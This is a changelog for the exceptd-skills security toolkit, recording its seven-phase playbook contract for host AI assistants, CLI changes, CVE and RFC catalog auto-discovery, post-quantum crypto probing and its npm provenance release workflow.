- **`reattest --latest [--playbook <id>] [--since <ISO>]`** — find the most-recent attestation automatically. No session-id required.

### New playbooks (12 → 13)

- **`crypto-codebase`** (scope: code, attack_class: pqc-exposure) — complements the host-side `crypto` playbook. Walks the codebase for in-source crypto choices: weak hash imports (MD5/SHA1), `Math.random()` in security context, PBKDF2 iteration counts, ECDSA curve choices, RSA bit-size constants, PQC adoption signals. Theater fingerprints include `pqc-ready-feature-flag-without-ml-kem` (config toggle with zero ML-KEM call sites), `fips-validated-by-linking-openssl` (link-time vs runtime FIPS provider), `pbkdf2-iterations-set-in-2015` (10k defaults in published packages).
- **`library-author`** (scope: code, attack_class: supply-chain) — audits what you SHIP, not what you run. Vendored deps, SBOM signing posture, SLSA provenance attestation, VEX issuance, npm provenance, Rekor entries, cosign signing, branch protection, OIDC vs static publish tokens, EU CRA Art.13/14 conformity. Distinct from `sbom` (install-side); this is publish-side. Mutex with `secrets` since both compete for repo-walk cycles.

### feeds_into threshold matrix (v0.10.2 doc pass)

AGENTS.md now ships the full feeds_into matrix — 25 chains across 12 playbooks. Documents what triggers what, so operators understand the suggested-next-playbook routing rather than treating it as opaque magic. Highlights:

- `framework` is the natural correlation layer — many playbooks chain into it on `analyze.compliance_theater_check.verdict == 'theater'`.
- `sbom` is the breadth-of-impact follow-up most playbooks suggest when `analyze.blast_radius_score >= 4`.
- `kernel + hardening + runtime` form a tightly-coupled triangle (any one raises questions in the other two).
- `always` conditions on `hardening → kernel`, `runtime → kernel`, `runtime → hardening`, `containers → secrets` — the AI should always at least offer the next playbook to the operator.

### Internal

- **kernel.json feeds_into typo fix** — `compliance-theater` referent (no such playbook ID) corrected to `framework` (the playbook carrying the compliance-theater attack class). Test updated to assert the corrected chain.
- **`vexFilterFromDoc` helper** in `lib/playbook-runner.js` — parses CycloneDX VEX or OpenVEX documents into a `Set<string>` of CVE IDs whose disposition is "not_affected" or equivalent.
- **AGENTS.md** — new "feeds_into threshold matrix" section + "CLI reference" table.

### Still deferred (next pass)

- crypto-codebase playbook ships `eu-ai-act` and `cmmc` in `frameworks_in_scope` but doesn't thread either into `framework_gap_mapping` — Hard Rule #4 (no orphaned references) tidy. Either drop the entries or add concrete mapping in a follow-up.
- Crypto-codebase byte size (95 KB) is above the 50-60 KB target for new playbooks — load-bearing content but worth a depth audit.
- `_meta.feeds_into[].condition` parser supports a limited DSL — some playbooks use expressions like `any matched_cve.attack_class IN ['ai-c2', 'prompt-injection']` that the current parser doesn't fully support. Conditions degrade silently to false. Worth a parser pass to either expand the DSL or warn on unknown shapes.

## 0.10.1 — 2026-05-12

**Patch: operator-reported bugs from v0.10.0 first contact + scope-aware `run` default.**

### New: `_meta.scope` + scope-aware multi-playbook `run`

Pre-0.10.1, `exceptd run` required a single explicit `<playbook>`. Operators had to know which of the 11 playbooks fit their context. Now:

- `exceptd run` (no args) auto-detects cwd: `.git/` → code playbooks; `/proc` + `/etc/os-release` → system playbooks. Always includes `cross-cutting`.
- `exceptd run --scope <type>` runs all playbooks matching `system | code | service | cross-cutting | all`.
- `exceptd run --all` runs every playbook.
- `exceptd run <playbook>` (explicit) keeps its existing behavior.

Each shipped playbook now carries `_meta.scope`:
- **system**: kernel · hardening · runtime · sbom · cred-stores
- **code**: secrets · containers
- **service**: mcp · ai-api · crypto
- **cross-cutting**: framework

Multi-playbook runs share one `session_id`; per-playbook attestations land under `.exceptd/attestations/<session_id>/<playbook_id>.json`. Aggregate output reports `summary.{succeeded, blocked, detected, inconclusive}`.

`exceptd plan` now groups output by scope by default with a `scope_summary` count. `--flat` returns the old flat list. `--scope <type>` filters.

### Bug fixes from operator first-contact

1. **Per-verb `--help` printed missing-arg errors.** `exceptd run --help` returned `{"ok":false,"error":"run: missing <playbookId> positional argument."}` instead of usage. Now every playbook verb (`plan`/`govern`/`direct`/`look`/`run`/`ingest`/`reattest`) honors `--help`/`-h` before positional validation and emits per-verb usage with flag descriptions, invocation modes, and `precondition_checks` submission shape.

2. **Preconditions were invisible to the host AI.** Neither `govern` nor `look` surfaced `_meta.preconditions`, so the AI couldn't see what facts to declare in its submission. `run` would then halt with `precondition_unverified` and the AI was blind. Fix: `look` response now includes `preconditions: [{id, check, on_fail, description}]` plus a `precondition_submission_shape` field giving the literal JSON shape (`{ "precondition_checks": { "<id>": true } }`) and an example. AGENTS.md updated.

3. **`precondition_checks` submission shape was undocumented in errors.** Preflight halt now returns a `remediation` field with the exact submission hint per failed precondition.

4. **`matched_cves` violated AGENTS.md Hard Rule #1.** Pre-0.10.1 output emitted `[{cve_id, rwep, cisa_kev, active_exploitation, ai_discovered}]` only — missing CVSS score/vector, KEV due date, PoC availability, AI-assisted-weaponization flag, patch availability, live-patch availability, EPSS, affected_versions, ATLAS/ATT&CK refs. The framework's own hard rule (every CVE reference must carry CVSS + KEV + PoC + AI-discovery + active-exploitation + patch/live-patch availability — theoretical-only is refused) was violated by the runner itself. Fix: `analyze.matched_cves[]` entries now carry all 15 required + optional Hard Rule #1 fields populated from the catalog. Null only when the catalog lacks the value, never when the runner forgot to forward.

5. **`detect.classification` ignored `signals.detection_classification`.** Agent could submit `{"detection_classification":"clean"}` with all-miss `signal_overrides` and still get `inconclusive`. Fix: agent override honored when set to `detected | inconclusive | not_detected | clean` (alias). Engine-computed classification used as fallback.

6. **`compliance_theater_check.verdict` stuck at `pending_agent_run` when classification was clear.** When the framework playbook ran with clean `detect.classification = not_detected`, the theater verdict still came back as pending instead of `clear`. Fix: when agent didn't submit `theater_verdict`, engine derives one from classification (`not_detected` → `clear`; otherwise `pending_agent_run`). Aliases `clean` / `no_theater` map to `clear`.

7. **No directive discoverability.** `exceptd plan` showed directive counts but not IDs/titles. Fix: `exceptd plan --directives` expands each playbook entry with `directives: [{id, title, applies_to}]`.

8. **No attestation inventory command.** Operators accumulated attestations under `.exceptd/attestations/` with no inventory verb; discovery required shell-globbing. Fix: new `exceptd list-attestations [--playbook <id>]` enumerates every prior session, sorted newest-first, with truncated evidence_hash + capture timestamp + file path.

### Deferred from operator report

These were noted in the same report and are scoped to v0.10.2 / v0.11:

- `framework-gap <framework> <cve-id>` named-framework filter doesn't match by gap-id prefix (carried over from v0.9.x).
- Crypto-codebase / library-internal playbook variant (new attack class for library authors).
- Framework-author operator persona (audit what you ship, not what you run).
- `reattest --latest <playbook>` / `--since <date>` (no need to know session-id).
- `run --diff-from-latest` for cron-driven baselines.
- `run --ci` exit-code-based gating for `.github/workflows/`.
- VEX consumption in sbom (`run sbom --vex vex.cdx.json` drops `known_not_affected` from analyze output).
- feeds_into threshold matrix documentation.

## 0.10.0 — 2026-05-11

**Minor: seven-phase playbook contract. exceptd becomes a knowledge layer that AI assistants consume, not a parallel scanner.**

### What changed at the architectural level

Pre-v0.10 `exceptd scan` shelled out from Node (`uname`, `openssl`, `kpatch list`, environment-variable inspection) — duplicating what host AIs like Claude Code already do better with their native `Bash`/`Read`/`Grep`/`Glob`. The new contract inverts the relationship: exceptd ships playbooks under `data/playbooks/*.json`; the host AI executes the host-side work; exceptd applies the knowledge + GRC layer around it.

The contract has seven phases:

**govern → direct → look → detect → analyze → validate → close**

exceptd owns govern / direct / analyze / validate / close (the knowledge + GRC work). The host AI owns look / detect (artifact collection + indicator evaluation against raw captures).

### New schema

`lib/schemas/playbook.schema.json` — JSON Schema (Draft 2020-12, ~33 KB) covering every required field of the seven-phase contract. Key features:

- `_meta`: id + version + `last_threat_review` + `threat_currency_score` (auto-block <50, warn <70) + `changelog[]` + `owner` + `air_gap_mode` + `preconditions[]` (halt/warn/skip_phase) + `mutex[]` + `feeds_into[]`.
- `domain`: structured `attack_class` (tight enum of 18 classes, every one backed by a shipped skill — no speculative entries) + ATLAS / ATT&CK / CVE / CWE / D3FEND refs + `frameworks_in_scope` (20+ framework IDs).
- `phases.govern`: jurisdiction obligations (window_hours + clock_starts), theater fingerprints, framework gap context with lag_score, skill_preload.
- `phases.direct`: threat_context with current CVEs/dates, RWEP threshold (escalate/monitor/close), framework_lag_declaration, skill_chain, token_budget.
- `phases.look`: typed artifacts (14 types incl. mcp_manifest / syscall_trace / embedding_store), collection_scope, environment_assumptions with if_false branches, fallback_if_unavailable with confidence_impact.
- `phases.detect`: typed indicators (12 types incl. prompt_pattern / embedding_anomaly / syscall_sequence) with deterministic boolean, false_positive_profile, minimum_signal (detected | inconclusive | not_detected).
- `phases.analyze`: rwep_inputs (signal → factor → weight), blast_radius_model (1-5 rubric), compliance_theater_check (claim / audit_evidence / reality_test / theater_verdict_if_gap), framework_gap_mapping, escalation_criteria.
- `phases.validate`: remediation_paths (priority-sorted with preconditions), validation_tests (functional / negative / regression / exploit_replay), residual_risk_statement (acceptance_level operator/manager/ciso/board), evidence_requirements (typed + retention_period + framework_satisfied), regression_trigger.
- `phases.close`: evidence_package (CSAF-2.0 / STIX-2.1 / markdown / pdf, Ed25519-signed by default), learning_loop writing to zeroday-lessons.json, notification_actions with ISO 8601 deadlines computed from clock_starts + window_hours, exception_generation with auditor_ready_language, regression_schedule.
- `directives[]`: each declares `applies_to` (cve / atlas_ttp / attack_technique / always) and optional `phase_overrides` letting one playbook handle multiple related conditions.

### New engine

`lib/playbook-runner.js` (~700 lines) implements the seven phases:

- `listPlaybooks` / `loadPlaybook` / `plan` (full session map).
- `preflight` enforces threat_currency_score gates (<50 hard-block unless `forceStale=true`, <70 warns), evaluates `_meta.preconditions` with on_fail halt/warn/skip_phase, enforces `_meta.mutex` against an in-process active-runs set.
- `govern` returns jurisdiction obligations + theater fingerprints + framework gap summary + skill_preload for the host AI to load.
- `direct` returns threat_context + RWEP threshold + skill_chain + token budget.
- `look` emits the typed-artifact collection plan; honors `air_gap_alternative` when `_meta.air_gap_mode=true`.
- `detect` accepts agent observations + signal_overrides, applies the false_positive_profile, classifies the signal as detected / inconclusive / not_detected.
- `analyze` resolves matched CVEs from `domain.cve_refs` via `cross-ref-api`, composes RWEP from base catalog score + per-input weighted adjustments, scores blast radius per rubric, runs the theater verdict, generates framework_gap_mapping entries per matched CVE, fires escalation_criteria.
- `validate` picks the highest-priority remediation_path whose preconditions hold, emits validation_tests including exploit_replay-class, renders residual_risk_statement, lists evidence_requirements per framework satisfied, computes regression next_run from soonest trigger.
- `close` assembles a CSAF-2.0 evidence bundle (HMAC-signed when a session_key is provided; Ed25519-signing path pending separate `sign-evidence` ceremony), drafts the learning_loop lesson with attack_vector / control_gap / framework_gap / new_control_requirement, computes notification_actions ISO deadlines from `clock_starts` events + `window_hours`, evaluates `exception_generation.trigger_condition` and renders the `auditor_ready_language` with finding context interpolated, finalizes the regression schedule, lists downstream playbooks per `_meta.feeds_into`.
- `run` orchestrates the full chain in one call. Emits a stable `evidence_hash` for re-attestation. Mutex enforced via try/finally on `_activeRuns`.

`lib/cross-ref-api.js` is the pure read-only knowledge layer (`byCve` / `byCwe` / `byTtp` / `bySkill` / `byFramework` / `recipesFor` / `theaterTestsFor` / `globalFrameworkContext`) the analyze phase composes against.

### Playbooks

`data/playbooks/` ships 11 playbooks covering: kernel, mcp, crypto, ai-api, framework, sbom, runtime, hardening, secrets, cred-stores, containers. Each playbook is a complete seven-phase contract; each declares ≥ 2 directives; each lists at least one applicable jurisdiction obligation; each populates a compliance_theater_check that distinguishes paper compliance from actual exposure.

### Tests

`tests/playbook-runner.test.js` covers preflight (currency gate / preconditions / mutex), phase resolution (deepMerge + phase_overrides), all seven phases, run() end-to-end, edge cases, and the evalCondition expression DSL. ~30-50 cases; runs serial under `--test-concurrency=1`.

### CLI

New verbs: `exceptd plan` / `govern <pb>` / `direct <pb>` / `look <pb>` / `run <pb> --evidence <file|->` / `ingest` (alias of `run`) / `reattest <session-id>`. JSON to stdout by default; `--pretty` for indented. `--air-gap` honors `_meta.air_gap_mode`. `--force-stale` overrides the currency hard-block.

### Deprecated

`exceptd scan` remains as a legacy alias that runs the pre-v0.10 hardcoded probes. New code should call `exceptd plan` / `exceptd run` instead. The scanner emits a banner at startup pointing operators at the new contract; it will be removed in v1.0.

### AGENTS.md

New section "Seven-phase playbook contract" teaches host AIs how to invoke the runner, what each phase requires of them, and what they MUST and MUST NOT do at each phase. Includes a worked example walking a kernel-LPE investigation from govern through close with realistic deadline computation.

## 0.9.5 — 2026-05-12

**Pin: six operator-reported bug fixes from real CLI use.**

### Bug 1 — Currency formula penalized `forward_watch` entries

`pipeline.js` and `scripts/builders/currency.js` subtracted 5 points per `forward_watch` item, so a skill that diligently tracked 14 upcoming threats scored **30%** the day after a review. Perverse incentive: punished skills doing the right thing. **Fix**: `forward_watch` no longer affects the score — currency is now a pure function of age-since-last_threat_review. `cloud-security` jumped from 30% → 100%; `sector-financial` from 40% → 100%; etc. The decay-formula docstring documents the change.

### Bug 2 — `exceptd report executive` mixed currency thresholds in messaging

Earlier output mixed `< 70%` ("skills need review") with `< 50%` ("require immediate update") in the same block, which read inconsistently. **Fix**: report now splits into two named tiers with the threshold inline:
- *Critical-stale* (`< 50%`, `> 90` days)
- *Stale* (`50-69%`, `30-90` days)

### Bug 3 — PQC scanner stopped at "verify ML-KEM/ML-DSA"

The scanner detected OpenSSL 3.5+ as "PQC-capable" but never actually probed for the algorithms. **Fix**: new `probePqcAlgorithms()` queries the runtime via three channels (Node `crypto.kemEncapsulate`/`getCurves`/`getHashes`/`getCiphers`, `openssl list -kem-algorithms`, `openssl list -signature-algorithms`) and returns boolean availability flags. Probes **22 algorithm flags** across the full emerging PQC landscape:

| Tier | Algorithms |
|---|---|
| **NIST finalized (FIPS 203/204/205)** | ML-KEM (Kyber), ML-DSA (Dilithium), SLH-DSA (SPHINCS+) |
| **NIST draft / alternate** | FN-DSA (Falcon, FIPS 206 draft), HQC (alternate KEM, March 2025) |
| **NIST Round-4 / niche** | FrodoKEM, NTRU / NTRU-Prime, Classic McEliece, BIKE |
| **NIST signature on-ramp (Round 2, 2024+)** | HAWK, MAYO, SQIsign, CROSS, UOV/SNOVA, SDitH, MIRATH, FAEST, PERK |
| **Stateful hash sigs** | LMS (RFC 8554), XMSS (RFC 8391), HSS |
| **IETF composite / hybrid** | composite signatures (RSA+ML-DSA, ECDSA+ML-DSA, etc.), composite KEMs (X25519+ML-KEM) |

The scanner finding now surfaces per-algo `provider_hint` so an operator can tell whether availability came from Node's runtime, the OpenSSL provider, or OQS.

### Bug 4 — Dispatcher hid CVE IDs behind aggregate counts

`dispatch` previously said *"1 CISA KEV CVE with RWEP ≥ 90"* without naming the CVE. **Fix**: dispatcher threads the per-finding `items[]` array into each plan entry as an `evidence` block. The print path renders each CVE explicitly:
```
[CRITICAL] compliance-theater
  Triggered by: cisa_kev_high_rwep (framework)
  Action: 1 CISA KEV CVEs with RWEP >= 90...
  Evidence:
    - CVE-2026-31431 · "Copy Fail" · RWEP 90
```

### Bug 5 — `exceptd verify` succeeded without disclosing key fingerprint

A swapped `keys/public.pem` would still produce *"38/38 passed"* — operators had no way to detect key substitution from the exit code alone. **Fix**: verify now prints **both SHA-256 and SHA3-512** fingerprints of the public key:

```
[verify] Public key: keys/public.pem
[verify] SHA256:jD19nBPExofyiO60loNQgx5ONUbrwxG8XZM8Hh7pV+w=
[verify] SHA3-512:okdinIchi8kMtlhOyYmDquwaRw2TSpJFe9MjfGpGI+7mE5dwPy5ZUVG4Hx1PB9KJkInLAzemhE1gsmhjZ0USww==
```

SHA-256 matches `ssh-keygen -lf` / GPG / npm-provenance / Sigstore conventions; SHA3-512 hedges against SHA-2 family weaknesses with the same Keccak family ML-KEM/ML-DSA use internally. Operators pin one (or both) out-of-band.

### Bug 6 — `framework-gap-analysis` had no programmatic CLI runner

Earlier `exceptd dispatch` would say *"run framework-gap-analysis"* but the only thing the CLI could actually do was `exceptd skill framework-gap-analysis` to dump the body. **Fix**: new `exceptd framework-gap <FRAMEWORK_ID|all> <SCENARIO|CVE-ID> [--json]` subcommand executes the analytical path in `lib/framework-gap.js`. Produces structured human or JSON output covering matching gaps, universal gaps, theater-risk controls per framework.

Examples:
```bash
exceptd framework-gap NIST-800-53 CVE-2026-31431
exceptd framework-gap PCI-DSS-4.0 "prompt injection"
exceptd framework-gap all CVE-2025-53773 --json
```

13/13 predeploy gates green; 201 tests pass.

## 0.9.4 — 2026-05-12

**Pin: drop upper bound on Node engine requirement.**

`package.json` `engines.node` goes from `>=24.0.0 <25.0.0` to `>=24.0.0`. The strict upper bound emitted `EBADENGINE` warnings on Node 25+ installs even though the code works fine — the project uses only Node stdlib APIs that have been stable since Node 18.

## 0.9.3 — 2026-05-12

**Pin: expand RFC auto-discovery seed list for broader project coverage.**

`SEED_RFC_GROUPS` grows from 35 → 48 working groups. The v0.9.2 seed focused on transport/crypto/PKI/identity which is core but missed several IETF areas the project actually depends on:

| Added WG | Why it matters |
|---|---|
| `wimse` | Workload Identity in Multi-System Environments — federal zero-trust mandates, cloud-native workload identity. Touches identity-assurance + sector-federal-government skills. |
| `gnap` | Grant Negotiation and Authorization Protocol — OAuth 2 successor. |
| `ace` | Authentication & Authorization for Constrained Environments — OT/ICS auth. |
| `core` | Constrained RESTful Environments (CoAP) — IoT supply chain. |
| `cbor` | Foundation for COSE, attestation tokens, SCITT receipts. |
| `trans` | Certificate Transparency — compliance evidence for cert issuance. |
| `ntp` | Network Time Protocol — audit trails need monotonic time (DORA, NYDFS, NIS2 breach clocks). |
| `opsawg` | Operations and Management Area WG — operational telemetry. |
| `opsec` | Operational Security Area — security guidance for operators. |
| `dance` | DANE Authentication for Named Entities Enhancements — DNS-anchored TLS trust. |
| `netmod` | NETCONF data modeling — YANG security models. |
| `jsonschema` | JSON Schema (now an IETF working group) — DB validation, API schemas, security policy serialization. |
| `httpapi` (existed) → confirmed | HTTP API standards (already there from v0.9.2). |

Test breadth assertion bumped from `>= 30` to `>= 40` WGs. Same dynamic-derivation behavior on top (union with cache-derived WGs from rfc-references.json's Datatracker docs).

**Database coverage rationale**: IETF doesn't have a "database" WG because DB wire protocols (Postgres, MongoDB, etc.) aren't IETF-standardized. The security infrastructure databases USE — TLS for connections, SASL/Kerberos auth, workload identity, field encryption, audit-trail time anchoring, cert validation, access-control sync — is all covered by the WGs above. `jsonschema` adds the DB+API+policy schema validation layer that was previously missing.

201 tests pass; 13/13 predeploy gates green.

## 0.9.2 — 2026-05-12

**Pin: auto-discovery for KEV + IETF catalogs.** The refresh workflow now adds *new* catalog entries automatically instead of only updating existing ones.

### What changed

- **CISA KEV discovery** — when CISA adds a new CVE to the Known Exploited Vulnerabilities list, the next nightly refresh detects it (cached KEV feed entry, not in local `data/cve-catalog.json`) and emits a draft entry. NVD CVSS metrics + EPSS score pulled from the prefetch cache when available; nulled otherwise. Initial RWEP score computed via `lib/scoring.js` with KEV=true + suspected exploitation + reboot-required = baseline ~55.
- **IETF RFC discovery** — Datatracker query against project-relevant working groups returns recent RFCs not in `data/rfc-references.json`. WG filter is the union of (a) dynamically derived from cached Datatracker docs on currently-cited RFCs, plus (b) a curated seed list of 35 WGs covering crypto/PKI/TLS, identity/auth/SSO, supply chain/attestation (`scitt` / `rats` / `suit` / `teep`), threat intel (`mile` / `sacm`), DNS security, messaging E2E, and IoT mgmt. Seed list documented in `lib/auto-discovery.js`.
- **Draft entry annotation** — every auto-imported entry carries an `_auto_imported` block:
  ```jsonc
  "_auto_imported": {
    "source": "KEV discovery",
    "imported_at": "2026-05-12",
    "curation_needed": [
      "type (LPE/RCE/SSRF/etc.)",
      "framework_control_gaps mapping",
      "atlas_refs + attack_refs categorization",
      ...
    ]
  }
  ```
  Mechanical fields (CVSS, KEV, EPSS, name, vendor) get populated; analytical fields (framework_control_gaps, ATLAS/ATT&CK refs, type classification) stay null and are listed for human curation.
- **PR body** in `refresh.yml` now splits cleanly: **"New entries (auto-imported — needs human curation)"** table first, then **"Updates to existing entries"** table. New label `needs-curation` added alongside the existing `data-refresh` + `automation`.
- **Volume cap** — 20 new entries per PR per source (configurable via `DEFAULT_CAP`). Spill is reported in the summary so a CISA mass-add doesn't generate an unreviewable PR.

### `lib/auto-discovery.js` (new module, ~280 lines, zero deps)

- `discoverNewKev(ctx, cap?)` — KEV → array of `op:"add"` diffs
- `discoverNewRfcs(ctx, opts?)` — RFC discovery via Datatracker WG queries
- `buildKevDraftEntry(kev, nvd?, epss?)` — pure function, no I/O, easy to test
- `getProjectRfcGroups(ctx)` — union of cache-derived + `SEED_RFC_GROUPS`
- `SEED_RFC_GROUPS` — curated WG list (exported for testing + transparency)

### `lib/refresh-external.js` changes

- `KEV_SOURCE.fetchDiff` now merges drift-check + discovery in cache mode (`kevDiffWithDiscoveryFromCache`)
- `RFC_SOURCE.fetchDiff` same pattern (`rfcDiffWithDiscoveryFromCache` — drift from cache, discovery live)
- `applyDiff` handlers learn the new `op: "add"` diff shape and insert entries verbatim. Returns enriched stats: `{ updated, added, drift_updated, errors }`.

### Tests

`tests/auto-discovery.test.js` — 9 new tests:
- Seed WG breadth (must include `tls`, `oauth`, `scitt`, `rats`, `dnsop`, `acme`, `mls`, etc.)
- `buildKevDraftEntry` populates all required schema fields
- NVD CVSS + CWE extraction
- EPSS score extraction
- Empty result when KEV cache missing
- New CVE detection (filters out CVEs already in local catalog)
- Volume cap + spill counting
- RWEP score bounded 0–100

Total: 192 → **201 tests**. 13/13 predeploy gates green.

### Operational note

The first run after deploy will likely pick up **8 new KEV entries** from the past ~5 days of CISA activity (visible in `/api/intel` already). These appear in the next auto-PR as a curated batch.

## 0.9.1 — 2026-05-11

**Patch: test-runner concurrency fix for first npm publish.**

The v0.9.0 release workflow failed at the predeploy `Run tests` gate on the Linux CI runner with a byte-stability assertion on `data/_indexes/section-offsets.json`. Root cause: the Node test runner defaults to running test files in parallel, and three test files (`tests/build-incremental.test.js`, `tests/indexes-v070.test.js`, `tests/refresh-*.test.js`) all manipulate shared filesystem state under `data/_indexes/` + `refresh-report.json` + skill bodies. The `build-incremental` test that temporarily touches `skills/compliance-theater/skill.md` races against the idempotence assertion in `indexes-v070`, producing a different `section-offsets.json` snapshot between the two reads.

Fix: add `--test-concurrency=1` to both `npm test` and the predeploy test gate. Sequential file execution adds ~1.5s locally and eliminates the race entirely. No code or schema changes — only the test runner flag.

Tag rule on the remote prevented rewriting `v0.9.0` (correctly — published tags are immutable by repo policy), so this version becomes the actual first npm publish under `@blamejs/exceptd-skills`. `v0.9.0` on the remote remains as a historical marker for the failed release attempt.

## 0.9.0 — 2026-05-11

**Minor: npm distribution. Package is now `@blamejs/exceptd-skills` on npm with provenance attestation.** Adds a clean `npx` install path for AI consumers and operators, a single-entry-point `exceptd` CLI that dispatches to every internal command, a tag-triggered release workflow with GitHub OIDC-signed provenance, and a new predeploy gate that checks the publish tarball shape on every commit.

### npm publishing

- **Package name**: `@blamejs/exceptd-skills` (was `exceptd-security`, never published)
- **Distribution**: `https://www.npmjs.com/package/@blamejs/exceptd-skills`
- **Provenance**: every release tarball is signed via GitHub OIDC + npm `--provenance`. Consumers can verify with `npm audit signatures`.
- **`publishConfig.access`**: `public` (scoped public packages need this explicit)
- **`files`** whitelist replaces the previous `private: true` block — only `bin/`, `lib/`, `orchestrator/`, `scripts/`, `vendor/`, `agents/`, `data/`, `skills/`, `keys/public.pem`, and top-level docs ship. Tests, `.cache/`, `.keys/`, `refresh-report.json`, dev tooling are excluded.
- **Tarball**: ~860 KB packed / 3 MB unpacked / 136 files.

### `bin/exceptd.js` CLI

Single executable, exposed as `exceptd` after install. Dispatches to every existing script:

```
npx @blamejs/exceptd-skills path                          # absolute install path
npx @blamejs/exceptd-skills prefetch
npx @blamejs/exceptd-skills refresh --from-cache --swarm
npx @blamejs/exceptd-skills build-indexes --changed --parallel
npx @blamejs/exceptd-skills validate-cves --from-cache
npx @blamejs/exceptd-skills currency
npx @blamejs/exceptd-skills skill kernel-lpe-triage
```

The `exceptd path` subcommand is the recommended way for downstream AI consumers to discover where the installed package lives — they point their assistant at `<path>/AGENTS.md` + `<path>/data/_indexes/summary-cards.json` without needing to know the npm install location.

### Release workflow `.github/workflows/release.yml`

- **Trigger**: tag push matching `v*.*.*` (or `workflow_dispatch` for dry-runs)
- **Gates**: verifies tag ↔ package.json version match → `npm install --no-audit --no-fund` (asserts zero deps) → `npm run bootstrap` → `npm run predeploy` (all 13 gates) → `npm pack --dry-run` preview → `npm publish --access public --provenance` → GitHub Release with the CHANGELOG section as the body
- **Permissions**: `contents: write` + `id-token: write` (OIDC for provenance)
- **Secrets**: `NPM_TOKEN` (granular automation token, scoped to `@blamejs/exceptd-skills` only)
- **Dry-run mode**: `workflow_dispatch` with `dry_run: true` skips the `npm publish` and GitHub Release steps but runs everything else

### `validate-package` predeploy gate

New gate (#13 in the predeploy sequence). Runs `npm pack --dry-run --json` and asserts:

- Every required file (README, LICENSE, NOTICE, AGENTS, manifest, sbom, bin, lib leaves, vendor leaves, data/_indexes/_meta, keys/public.pem) is present in the publish tarball
- No forbidden file (`.keys/`, `.cache/`, `tests/`, `refresh-report.json`, `.env*`, `node_modules/`, any non-public `.pem`) is in the publish tarball
- Tarball size is under 5 MB
- `bin/exceptd.js` has a `#!/usr/bin/env node` shebang
- `package.json` invariants: not private, has `bin.exceptd`, has `files[]`, has `publishConfig.access: public` + `provenance: true`

Predeploy gate count: **12 → 13**. All green on this release.

### Other changes

- **README rewrite**: three audience paths (AI consumer / operator / maintainer), npx install instructions, full CLI command reference, pre-computed indexes summary. npm badge added back alongside the release badge.
- **MAINTAINERS.md release runbook**: full one-time setup + per-release procedure + dry-run instructions + rollback options + consumer verification commands.
- **SBOM updates**: package's own `bom-ref` switches from `pkg:project/exceptd-skills@version` to canonical PURL `pkg:npm/@blamejs/exceptd-skills@version`. Adds `externalReferences` linking to the npm package page + GitHub repo.
- **Tests**: 182 → 192 (10 new in `tests/bin-dispatcher.test.js`). Covers help, version, path, alias flags, unknown command, orchestrator passthrough, package.json publish-readiness invariants.
- **package.json updates**: keywords array for npm discoverability (`ai-security`, `compliance`, `cve`, `kev`, `mcp`, `prompt-injection`, `rwep`, `threat-intelligence`, etc.), explicit `author` field, `prepublishOnly` runs `predeploy + validate-package` so an accidental `npm publish` can't skip the gates.

### Operator workflows

The npm distribution doesn't change how the project is used. It just gives a cleaner install path:

```
# Previously: required git clone + npm run bootstrap
git clone https://github.com/blamejs/exceptd-skills && cd exceptd-skills && npm run bootstrap

# Now: one command, no clone, no install
npx @blamejs/exceptd-skills path
npx @blamejs/exceptd-skills prefetch
```

Maintainers still clone + `npm run bootstrap` + `npm run predeploy` for active development.

### Release this version

This release ships the npm publish infrastructure but does NOT itself publish. To publish v0.9.0 to npm, the maintainer must push the `v0.9.0` tag (after this commit lands on `main`) and supply `NPM_TOKEN` in repo secrets. See `MAINTAINERS.md` § "Release runbook" for the full procedure.

## 0.8.0 — 2026-05-11

**Minor: prefetch cache + queue/retry/worker primitives + incremental build + swarm fan-out.** Adds the infrastructure to (a) warm a local cache of every upstream artifact so refresh/validate work without re-paying network cost, (b) run source fetches and builders in parallel, (c) rebuild only what changed since the last build. Also vendors `retry.js` + `worker-pool.js` from blamejs so battle-tested retry/threading semantics aren't reinvented.

### Vendored from blamejs (Apache-2.0)

- `vendor/blamejs/retry.js` — flattened and stripped from `blamejs@1442f17/lib/retry.js`. Provides `withRetry`, `isRetryable`, `backoffDelay`, `CircuitBreaker`. Stripped: observability sink, audit hooks, `numeric-checks` dep, `safeAsync.sleep` (replaced with stdlib AbortSignal-aware sleep). Documented exceptd delta: the sleep timer is NOT `unref`'d (one-shot CLI callers need the event loop kept alive while the backoff completes).
- `vendor/blamejs/worker-pool.js` — flattened and stripped from `blamejs@1442f17/lib/worker-pool.js`. Provides `create(scriptPath, opts) → { run, drain, terminate, stats }` with bounded concurrency, bounded queue depth, per-task timeout, and worker recycle. Stripped: `WorkerPoolError` class (replaced with `Error` carrying a `code` field), `validate-opts` / `numeric-bounds` / `constants` deps, audit sink.
- `vendor/blamejs/_PROVENANCE.json` — pinned commit, vendored sha256 + upstream sha256 at pin, strip rules per file, exceptd-deltas.
- `vendor/blamejs/README.md` + `vendor/blamejs/LICENSE` — re-vendor instructions + Apache-2.0 license text.
- `NOTICE` updated with full attribution paragraph.

### New `lib/` primitives

- **`lib/job-queue.js`** — async queue with per-source concurrency caps, token-bucket rate limiting, priority ordering, and per-source stats. Retry classification + exponential backoff delegated to vendored `retry.js`. Used by the upstream-fetch path of `refresh-external` and (transitively) `prefetch`.
- **`lib/worker-pool.js`** — thin wrapper over vendored `worker-pool` providing a `WorkerPool` class + `runAll(tasks)` helper. Available to any caller wanting CPU fan-out, used today by the `--parallel` test harness pattern.
- **`lib/prefetch.js`** — downloads and caches every upstream artifact this project consumes into `.cache/upstream/` (gitignored). Layout: `_index.json` + `<source>/<id>.json`. Sources: `kev` (CISA), `nvd`, `epss`, `rfc` (IETF Datatracker), `pins` (MITRE GitHub releases). Per-source rate budgets via JobQueue. `--max-age <dur>` to skip fresh entries, `--source <names>` filter, `--force`, `--no-network` (dry-run plan).
- **`lib/validate-vendor.js`** — predeploy gate. Re-hashes every vendored file and compares to `_PROVENANCE.json`; smoke-loads each via `require()`. Silent hand-edits to a vendored copy fail the build.

### refresh-external — cache + swarm + report-out

- **`--from-cache [<dir>]`** — read every source from the prefetch cache instead of upstream. Default path `.cache/upstream`. Combine with `--apply` for fully-offline upserts.
- **`--swarm`** — fan-out source fetches across worker threads (`Promise.all`-based). Best paired with `--from-cache` so the parallel workers don't compete for upstream rate budgets. Report shape is identical to sequential mode.
- **`--report-out <path>`** — redirect the `refresh-report.json` artifact so parallel test suites don't race on the shared file at the repo root.
- Cache helpers per source (`kevDiffFromCache`, `epssDiffFromCache`, `nvdDiffFromCache`, `rfcDiffFromCache`, `pinsDiffFromCache`) — synthesize the same `ValidationResult` shape downstream consumers already understand.

